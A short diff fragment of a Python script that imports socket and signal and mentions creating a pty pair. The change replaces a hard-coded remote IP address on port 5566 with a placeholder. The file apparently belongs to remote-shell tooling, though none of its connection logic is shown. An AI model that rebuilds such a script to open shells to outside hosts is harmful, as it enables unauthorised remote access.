@@ -8,7 +8,7 @@ import time
 import signal
 from socket import *
 
-ADDR=("14.152.57.47",5566)
+ADDR=("xxx.xxx.xxx.xxx",5566)
 CHILD=0
 
 # 生成pty对
